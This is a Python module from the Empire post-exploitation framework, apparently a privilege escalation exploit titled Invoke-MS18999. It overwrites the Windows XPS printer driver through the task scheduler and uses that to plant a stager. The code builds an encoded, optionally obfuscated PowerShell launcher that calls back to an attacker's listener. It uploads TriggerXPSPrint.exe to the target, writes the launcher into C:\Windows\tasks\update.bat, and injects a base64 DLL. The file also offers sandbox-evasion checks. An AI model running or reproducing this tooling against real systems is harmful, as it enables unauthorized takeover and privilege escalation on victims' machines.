import base64
import os
import json
import hashlib
from lib.common import helpers
from pydispatch import dispatcher


class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-MS18999',

            # List of one or more authors for the module
            'Author': ['@OneLogicalMyth'],

            # More verbose multi-line description of the module
            'Description': ('Uses the Windows task scheudler to overwrite the XPS printer driver and hijack with an Empire stager.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'Concept taken from the original PoC released by @SandboxEscaper modified to work in PowerShell.',
                'https://github.com/OneLogicalMyth/zeroday-powershell'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description':   'Agent to use for the event log search',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1'
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        # Read in the source script
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-MS18999.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        #read in original DLL
        origPath = "%s/data/misc/MS18-999.dll" % (self.mainMenu.installPath)

        if os.path.isfile(origPath):

            with open(origPath, 'rb') as f:
                dllRaw = f.read()

        # staging options
        listenerName = self.options['Listener']['Value']
        language = self.options['Language']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        AgentName = self.options['Agent']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            obfuscateScript = False
            if obfuscate.lower() == "true":
                obfuscateScript = True
            
            if obfuscateScript and "launcher" in obfuscateCommand.lower():
                print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager.")
                return ""
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks)

            if launcher == "":
                print helpers.color("[!] Error in launcher generation.")
                return ""
            else:
                launcherCode = launcher.split(" ")[-1]

        # upload TriggerXPSPrint.exe
        TriggerXPSPrint = "%s/data/misc/TriggerXPSPrint.exe" % (self.mainMenu.installPath)
        uploadname = r"C:\Windows\Tasks\TriggerXPSPrint.exe"
        sessionID = self.mainMenu.agents.get_agent_id_db(AgentName)

        # read in the file and base64 encode it for transport
        open_file = open(TriggerXPSPrint, 'r')
        file_data = open_file.read()
        open_file.close()

        # dispatch this event
        message = "[*] Tasked agent to upload {}, {}".format(uploadname, helpers.get_file_size(file_data))
        signal = json.dumps({
            'print': True,
            'message': message,
            'file_name': uploadname,
            'file_md5': hashlib.md5(file_data).hexdigest(),
            'file_size': helpers.get_file_size(file_data)
        })
        dispatcher.send(signal, sender="agents/{}".format(sessionID))

        # update the agent log
        msg = "Tasked agent to upload %s : %s" % (TriggerXPSPrint, hashlib.md5(file_data).hexdigest())
        self.mainMenu.agents.save_agent_log(sessionID, msg)
        
        # upload packets -> "filename | script data"
        file_data = helpers.encode_base64(file_data)
        data = uploadname + "|" + file_data
        self.mainMenu.agents.add_agent_task_db(sessionID, "TASK_UPLOAD", data)


        script = moduleCode

        b64dll = base64.b64encode(dllRaw)
        b64dll = "%r"%b64dll
        launcherCode = "%r"%launcherCode

        scriptEnd = "'powershell -noP -sta -w 1 -enc " + launcherCode.replace("'","\"") + "' | Set-Content c:\Windows\\tasks\update.bat -Encoding Ascii;"
        scriptEnd += "Invoke-MS18999"
        scriptEnd += " -DLL " + b64dll.replace("'","\"")


        if obfuscateScript:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd

        return script
